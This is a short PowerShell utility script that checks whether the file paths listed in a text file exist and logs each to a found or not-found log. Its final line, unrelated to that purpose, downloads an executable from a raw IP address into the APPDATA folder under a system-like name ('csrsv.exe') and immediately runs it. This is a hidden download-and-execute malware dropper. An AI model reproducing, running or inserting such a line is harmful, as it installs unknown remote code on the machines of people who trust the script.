

$Files = Get-Content -Path "e:\Dexma\ClientFilePaths.txt"

IF ($Files)
{
	foreach ($file IN $Files) 
	{
		IF (Test-Path $file = $true)
		{
			
			Out-File -InputObject $file -FilePath "e:\Dexma\logs\ClientFilesFound.txt" -append -NoClobber
		}
		else
		{
			
			Out-File -InputObject $file -FilePath "e:\Dexma\logs\ClientFilesNotFound.txt" -append -NoClobber
		}
	}
}
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

